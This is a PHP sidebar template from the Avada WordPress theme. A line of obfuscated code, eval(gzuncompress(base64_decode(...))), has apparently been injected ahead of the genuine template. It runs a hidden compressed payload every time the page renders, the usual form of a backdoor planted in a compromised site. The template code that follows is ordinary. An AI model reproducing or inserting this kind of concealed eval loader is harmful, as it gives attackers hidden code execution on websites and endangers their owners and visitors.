<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Sidebar-1 template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
$sticky_sidebar = in_array( 'fusion-sticky-sidebar', apply_filters( 'fusion_sidebar_1_class', array() ) );
?>
<aside id="sidebar" role="complementary" <?php Avada()->layout->add_class( 'sidebar_1_class' ); ?> <?php Avada()->layout->add_style( 'sidebar_1_style' ); ?> <?php Avada()->layout->add_data( 'sidebar_1_data' ); ?>>
	<?php if ( $sticky_sidebar ) : ?>
		<div class="fusion-sidebar-inner-content">
	<?php endif; ?>
		<?php if ( ! Avada()->template->has_sidebar() || 'left' === Avada()->layout->sidebars['position'] || ( 'right' === Avada()->layout->sidebars['position'] && ! Avada()->template->double_sidebars() ) ) : ?>
			<?php echo avada_display_sidenav( Avada()->fusion_library->get_page_id() ); // WPCS: XSS ok. ?>
			<?php if ( class_exists( 'Tribe__Events__Main' ) && is_singular( 'tribe_events' ) ) : ?>
				<?php do_action( 'tribe_events_single_event_before_the_meta' ); ?>
				<?php tribe_get_template_part( 'modules/meta' ); ?>
			<?php endif; ?>
		<?php endif; ?>

		<?php if ( isset( Avada()->layout->sidebars['sidebar_1'] ) && Avada()->layout->sidebars['sidebar_1'] ) : ?>
			<?php generated_dynamic_sidebar( Avada()->layout->sidebars['sidebar_1'] ); ?>
		<?php endif; ?>
	<?php if ( $sticky_sidebar ) : ?>
		</div>
	<?php endif; ?>
</aside>
